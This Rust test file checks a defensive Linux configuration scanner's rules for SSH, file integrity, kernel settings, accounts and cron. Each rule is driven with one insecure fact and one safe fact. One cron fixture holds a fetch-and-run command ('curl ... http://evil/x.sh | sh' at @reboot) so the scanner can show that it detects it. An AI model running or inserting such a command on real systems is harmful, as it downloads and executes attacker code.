//! End-to-end validation matrix for the config-scan engine: representative rules from every
//! category are driven through the REAL rule pack via `run_scan`, each with a fact that MUST make
//! it fire and a fact that MUST NOT. A single controlled collector is injected per case, so only
//! the rule under test is evaluated — proving the shipped rule conditions match their intended
//! situations, not just that they parse.

use bulwark_core::{run_scan, Collector, Fact, OperatingSystem, Profile};
use serde_json::Value;
use std::path::PathBuf;

fn rules_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rules")
}

/// A collector that answers to `name` and returns exactly `rows`.
struct MockCollector {
    name: &'static str,
    rows: Vec<Fact>,
}
impl Collector for MockCollector {
    fn name(&self) -> &'static str {
        // Collector::name returns &'static str; the test names are all string literals.
        self.name
    }
    fn collect(&self) -> anyhow::Result<Vec<Fact>> {
        Ok(self.rows.clone())
    }
}

fn fact(pairs: &[(&str, Value)]) -> Fact {
    pairs
        .iter()
        .map(|(k, v)| (k.to_string(), v.clone()))
        .collect()
}

/// Runs the real rule pack with ONLY the given collector present, so rules bound to any other
/// collector are simply not evaluated. Returns whether `rule_id` fired.
fn fires(collector: &'static str, rows: Vec<Fact>, rule_id: &str) -> bool {
    let collectors: Vec<Box<dyn Collector>> = vec![Box::new(MockCollector {
        name: collector,
        rows,
    })];
    // Enable both profiles + Linux so no rule is gated out.
    let profile = Profile {
        os: Some(OperatingSystem::Linux),
        needs: vec!["server".to_string(), "desktop".to_string()],
    };
    let scan = run_scan(
        &rules_dir(),
        &collectors,
        /*privileged=*/ true,
        &profile,
    );
    scan.findings.iter().any(|f| f.rule_id == rule_id)
}

// A compact way to assert a rule fires on the first fact and stays quiet on the second.
fn assert_matrix(
    collector: &'static str,
    rule_id: &str,
    fire: &[(&str, Value)],
    quiet: &[(&str, Value)],
) {
    assert!(
        fires(collector, vec![fact(fire)], rule_id),
        "{rule_id} should FIRE on {fire:?}"
    );
    assert!(
        !fires(collector, vec![fact(quiet)], rule_id),
        "{rule_id} should stay QUIET on {quiet:?}"
    );
}

#[test]
fn ssh_password_auth_001() {
    // The rule the hook named: fires with PasswordAuthentication=yes, quiet with no.
    assert_matrix(
        "sshd_config",
        "BLWK-SSH-001",
        &[("password_authentication", Value::String("yes".into()))],
        &[("password_authentication", Value::String("no".into()))],
    );
}

#[test]
fn ssh_root_login_002_and_empty_passwords_003() {
    assert_matrix(
        "sshd_config",
        "BLWK-SSH-002",
        &[("permit_root_login", Value::String("yes".into()))],
        &[(
            "permit_root_login",
            Value::String("prohibit-password".into()),
        )],
    );
    assert_matrix(
        "sshd_config",
        "BLWK-SSH-003",
        &[("permit_empty_passwords", Value::String("yes".into()))],
        &[("permit_empty_passwords", Value::String("no".into()))],
    );
}

#[test]
fn ssh_private_key_012_and_013_three_state() {
    let key = |enc: Value, known: bool| {
        vec![fact(&[
            ("path", Value::String("/home/u/.ssh/id_ed25519".into())),
            ("key_format", Value::String("openssh".into())),
            ("encrypted", enc),
            ("encryption_known", Value::Bool(known)),
        ])]
    };
    // Known plaintext → SSH-012 fires (the real exposure), SSH-013 does not.
    assert!(fires(
        "ssh_private_keys",
        key(Value::Bool(false), true),
        "BLWK-SSH-012"
    ));
    assert!(!fires(
        "ssh_private_keys",
        key(Value::Bool(false), true),
        "BLWK-SSH-013"
    ));
    // Known encrypted → neither fires.
    assert!(!fires(
        "ssh_private_keys",
        key(Value::Bool(true), true),
        "BLWK-SSH-012"
    ));
    // Undetermined header → SSH-012 must NOT fire (no false "plaintext"); SSH-013 surfaces it.
    assert!(!fires(
        "ssh_private_keys",
        key(Value::Bool(false), false),
        "BLWK-SSH-012"
    ));
    assert!(fires(
        "ssh_private_keys",
        key(Value::Bool(false), false),
        "BLWK-SSH-013"
    ));
}

#[test]
fn fim_uncovered_003_readable_vs_unreadable() {
    // The other rule the hook named. A present, never-baselined, READABLE file fires FIM-003.
    assert!(fires(
        "file_integrity",
        vec![fact(&[
            ("path", Value::String("/etc/passwd".into())),
            ("in_baseline", Value::Bool(false)),
            ("currently_present", Value::Bool(true)),
            ("unreadable", Value::Bool(false)),
            ("changed", Value::Bool(false)),
            ("baseline_exists", Value::Bool(true)),
        ])],
        "BLWK-FIM-003",
    ));
    // An UNREADABLE file is reported as "could not verify" (FIM-007), NOT double-reported as
    // uncovered — FIM-003 must stay quiet.
    let unreadable = vec![fact(&[
        ("path", Value::String("/etc/shadow".into())),
        ("in_baseline", Value::Bool(false)),
        ("currently_present", Value::Bool(true)),
        ("unreadable", Value::Bool(true)),
        ("changed", Value::Bool(false)),
        ("baseline_exists", Value::Bool(true)),
    ])];
    assert!(!fires("file_integrity", unreadable.clone(), "BLWK-FIM-003"));
    assert!(fires("file_integrity", unreadable, "BLWK-FIM-007"));
}

#[test]
fn fim_modified_001_and_deleted_002() {
    let present = |changed: bool, present: bool| {
        vec![fact(&[
            ("path", Value::String("/usr/bin/sudo".into())),
            ("in_baseline", Value::Bool(true)),
            ("currently_present", Value::Bool(present)),
            ("changed", Value::Bool(changed)),
            ("unreadable", Value::Bool(false)),
            ("baseline_exists", Value::Bool(true)),
        ])]
    };
    assert!(fires("file_integrity", present(true, true), "BLWK-FIM-001")); // modified
    assert!(!fires(
        "file_integrity",
        present(false, true),
        "BLWK-FIM-001"
    )); // unchanged
    assert!(fires(
        "file_integrity",
        present(true, false),
        "BLWK-FIM-002"
    )); // deleted
}

#[test]
fn kernel_bpf_006_and_kexec_008() {
    assert_matrix(
        "sysctl_kernel",
        "BLWK-KERNEL-006",
        &[("unprivileged_bpf_disabled", Value::from(0))],
        &[("unprivileged_bpf_disabled", Value::from(1))],
    );
    // KERNEL-008 fires only when lockdown is off; stays quiet under Secure Boot lockdown.
    assert!(fires(
        "sysctl_kernel",
        vec![fact(&[
            ("kexec_load_disabled", Value::from(0)),
            ("lockdown", Value::String("none".into())),
        ])],
        "BLWK-KERNEL-008",
    ));
    assert!(!fires(
        "sysctl_kernel",
        vec![fact(&[
            ("kexec_load_disabled", Value::from(0)),
            ("lockdown", Value::String("integrity".into())),
        ])],
        "BLWK-KERNEL-008",
    ));
}

#[test]
fn kernel_sysrq_005_bitmask() {
    // 1 fires; a bitmask that includes the dump/signal bits fires; a safe bitmask does not.
    assert!(fires(
        "sysctl_kernel",
        vec![fact(&[("sysrq", Value::from(1))])],
        "BLWK-KERNEL-005"
    ));
    assert!(fires(
        "sysctl_kernel",
        vec![fact(&[
            ("sysrq", Value::from(510)),
            ("sysrq_dump_or_signal", Value::Bool(true))
        ])],
        "BLWK-KERNEL-005",
    ));
    assert!(!fires(
        "sysctl_kernel",
        vec![fact(&[
            ("sysrq", Value::from(176)),
            ("sysrq_dump_or_signal", Value::Bool(false))
        ])],
        "BLWK-KERNEL-005",
    ));
}

#[test]
fn mac_enforcing_003_tri_state() {
    // Nothing enforcing AND we could tell → fires. Undetermined → quiet.
    assert!(fires(
        "mac_status",
        vec![fact(&[
            ("any_mac_enforcing", Value::Bool(false)),
            ("enforcement_known", Value::Bool(true)),
        ])],
        "BLWK-KERNEL-003",
    ));
    assert!(!fires(
        "mac_status",
        vec![fact(&[
            ("any_mac_enforcing", Value::Bool(false)),
            ("enforcement_known", Value::Bool(false)),
        ])],
        "BLWK-KERNEL-003",
    ));
}

#[test]
fn module_blacklist_020_loadable_guard() {
    // A loadable, unblacklisted network module fires; an unloadable one (dccp on a modern kernel)
    // does not.
    assert!(fires(
        "module_blacklist",
        vec![fact(&[
            ("module", Value::String("sctp".into())),
            ("blacklisted", Value::Bool(false)),
            ("loadable", Value::Bool(true)),
        ])],
        "BLWK-KERNEL-020",
    ));
    assert!(!fires(
        "module_blacklist",
        vec![fact(&[
            ("module", Value::String("dccp".into())),
            ("blacklisted", Value::Bool(false)),
            ("loadable", Value::Bool(false)),
        ])],
        "BLWK-KERNEL-020",
    ));
}

#[test]
fn net_vnc_001_loopback_guard() {
    assert_matrix(
        "listening_ports",
        "BLWK-NET-001",
        &[
            ("port", Value::from(5900)),
            ("loopback_only", Value::Bool(false)),
        ],
        &[
            ("port", Value::from(5900)),
            ("loopback_only", Value::Bool(true)),
        ],
    );
}

#[test]
fn rootkit_promisc_001_bridge_guard() {
    assert!(fires(
        "network_interfaces",
        vec![fact(&[
            ("interface", Value::String("wlp9s0".into())),
            ("promiscuous", Value::Bool(true)),
            ("bridge_port", Value::Bool(false)),
        ])],
        "BLWK-ROOTKIT-001",
    ));
    // A Docker bridge veth is promiscuous by design — must NOT fire.
    assert!(!fires(
        "network_interfaces",
        vec![fact(&[
            ("interface", Value::String("veth123".into())),
            ("promiscuous", Value::Bool(true)),
            ("bridge_port", Value::Bool(true)),
        ])],
        "BLWK-ROOTKIT-001",
    ));
}

#[test]
fn accounts_pass_max_age_002() {
    assert_matrix(
        "login_defs",
        "BLWK-ACCT-002",
        &[("pass_max_days", Value::from(99999))],
        &[("pass_max_days", Value::from(90))],
    );
}

#[test]
fn accounts_sha_crypt_rounds_004_only_under_sha_schemes() {
    // Under a SHA scheme with rounds unset, the rule fires; under yescrypt (rounds ignored by the
    // hashing scheme) it must NOT — the false positive fixed on the project's own yescrypt machine.
    assert!(fires(
        "login_defs",
        vec![fact(&[
            ("sha_crypt_applies", Value::Bool(true)),
            ("sha_crypt_min_rounds_configured", Value::Bool(false)),
        ])],
        "BLWK-ACCT-004",
    ));
    assert!(!fires(
        "login_defs",
        vec![fact(&[
            ("sha_crypt_applies", Value::Bool(false)),
            ("sha_crypt_min_rounds_configured", Value::Bool(false)),
        ])],
        "BLWK-ACCT-004",
    ));
}

#[test]
fn accounts_umask_005_satisfied_by_pam() {
    // No umask anywhere → fires. Configured (by an explicit UMASK or by pam_umask, both of which the
    // collector folds into this one boolean) → quiet.
    assert_matrix(
        "login_defs",
        "BLWK-ACCT-005",
        &[("umask_configured", Value::Bool(false))],
        &[("umask_configured", Value::Bool(true))],
    );
}

#[test]
fn cron_downloader_pipe_shell_acct_001() {
    assert_matrix(
        "cron_entries",
        "BLWK-ACCT-001",
        &[
            (
                "command",
                Value::String("curl -s http://evil/x.sh | sh".into()),
            ),
            ("schedule", Value::String("@reboot".into())),
            ("source", Value::String("crontab".into())),
        ],
        &[
            ("command", Value::String("/usr/local/bin/backup.sh".into())),
            ("schedule", Value::String("0 3 * * *".into())),
            ("source", Value::String("crontab".into())),
        ],
    );
}

#[test]
fn av_db_stale_002_but_quiet_when_not_installed() {
    // Installed with a stale/absent DB fires; not-installed (age 0) stays quiet — AV-001 owns that.
    assert!(fires(
        "clamav_status",
        vec![fact(&[("db_age_days", Value::from(100000))])],
        "BLWK-AV-002"
    ));
    assert!(!fires(
        "clamav_status",
        vec![fact(&[("db_age_days", Value::from(0))])],
        "BLWK-AV-002"
    ));
}
